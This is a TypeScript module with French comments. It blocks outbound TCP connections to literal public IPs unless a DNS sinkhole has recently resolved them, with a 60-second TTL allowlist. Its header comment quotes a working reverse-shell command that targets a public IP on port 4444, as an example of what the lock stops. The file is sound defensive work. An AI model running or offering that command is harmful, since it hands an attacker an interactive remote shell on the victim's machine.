/**
 * Verrou n°1 (P0) : Confinement Egress Strict — Registre DNS-to-IP Allowlist (TTL 60s)
 * Bloque les reverse-shells TCP sortants ciblant directement une IP littérale codée en dur
 * (ex: /bin/sh -i >& /dev/tcp/185.220.101.99/4444) sans résolution DNS préalable autorisée.
 */

export interface AuthorizedIpEntry {
  ip: string;
  fqdn: string;
  expiresAt: number;
}

export interface IpVerificationResult {
  allowed: boolean;
  ip: string;
  fqdn?: string;
  threat_type: string;
  reason: string;
}

const IPV4_LITERAL_REGEX = /^(?:\d{1,3}\.){3}\d{1,3}(?::\d+)?$/;
const IPV6_LITERAL_REGEX = /^\[?[0-9a-fA-F:]+\]?(?::\d+)?$/;

export function isLiteralIpAddress(target: string): boolean {
  if (!target) return false;
  const cleaned = target.trim().replace(/^https?:\/\//i, '').split('/')[0];
  if (IPV4_LITERAL_REGEX.test(cleaned)) {
    const parts = cleaned.split(':')[0].split('.').map(Number);
    return parts.length === 4 && parts.every(n => n >= 0 && n <= 255);
  }
  if (cleaned.includes(':') && IPV6_LITERAL_REGEX.test(cleaned)) {
    return true;
  }
  return false;
}

export function extractPureIp(target: string): string {
  const cleaned = (target || '').trim().replace(/^https?:\/\//i, '').split('/')[0];
  if (cleaned.startsWith('[')) {
    const endBracket = cleaned.indexOf(']');
    if (endBracket !== -1) return cleaned.slice(1, endBracket);
  }
  if (IPV4_LITERAL_REGEX.test(cleaned)) {
    return cleaned.split(':')[0];
  }
  return cleaned;
}

export function isPrivateOrLoopbackIp(ip: string): boolean {
  const pure = extractPureIp(ip);
  if (pure === '127.0.0.1' || pure === '::1' || pure === '0.0.0.0' || pure === 'localhost') {
    return true;
  }
  const parts = pure.split('.').map(Number);
  if (parts.length === 4 && parts.every(n => !Number.isNaN(n))) {
    // 10.0.0.0/8
    if (parts[0] === 10) return true;
    // 172.16.0.0/12 (Docker bridge networks)
    if (parts[0] === 172 && parts[1] >= 16 && parts[1] <= 31) return true;
    // 192.168.0.0/16
    if (parts[0] === 192 && parts[1] === 168) return true;
  }
  return false;
}

export class DnsToIpAllowlist {
  private readonly entries = new Map<string, AuthorizedIpEntry>();
  private readonly defaultTtlMs: number;

  constructor(defaultTtlMs = 60_000) {
    this.defaultTtlMs = defaultTtlMs;
  }

  /**
   * Enregistre une IP résolue suite à une requête DNS légitime validée par le Sinkhole (:5053)
   */
  public authorizeResolvedIp(ip: string, fqdn: string, ttlMs = this.defaultTtlMs): void {
    const pureIp = extractPureIp(ip);
    if (!pureIp || pureIp === '0.0.0.0') return;
    this.entries.set(pureIp, {
      ip: pureIp,
      fqdn: fqdn.toLowerCase().trim(),
      expiresAt: Date.now() + ttlMs
    });
  }

  /**
   * Vérifie si une connexion TCP sortante vers une IP est autorisée (pré-résolue par DNS ou interne)
   */
  public verifyOutboundIp(targetIp: string): IpVerificationResult {
    const pureIp = extractPureIp(targetIp);

    if (isPrivateOrLoopbackIp(pureIp)) {
      return {
        allowed: true,
        ip: pureIp,
        fqdn: 'internal.aegis.local',
        threat_type: 'CLEAN_INTERNAL_EGRESS',
        reason: 'Communication réseau interne RFC1918 / Loopback autorisée'
      };
    }

    const entry = this.entries.get(pureIp);
    const now = Date.now();
    if (entry && entry.expiresAt > now) {
      return {
        allowed: true,
        ip: pureIp,
        fqdn: entry.fqdn,
        threat_type: 'CLEAN_EGRESS_DNS_VERIFIED',
        reason: `IP publique pré-autorisée via résolution DNS Sinkhole (${entry.fqdn}, TTL actif)`
      };
    }

    if (entry && entry.expiresAt <= now) {
      this.entries.delete(pureIp);
    }

    return {
      allowed: false,
      ip: pureIp,
      threat_type: 'DIRECT_IP_REVERSE_SHELL_BLOCKED',
      reason: `Tentative de connexion TCP sortante directe vers l'IP littérale ${pureIp} sans résolution DNS préalable sur :5053 (Verrou P0 Anti-Reverse Shell)`
    };
  }

  public purgeExpired(): number {
    const now = Date.now();
    let purged = 0;
    for (const [ip, entry] of this.entries.entries()) {
      if (entry.expiresAt <= now) {
        this.entries.delete(ip);
        purged++;
      }
    }
    return purged;
  }

  public size(): number {
    this.purgeExpired();
    return this.entries.size;
  }

  public clear(): void {
    this.entries.clear();
  }
}
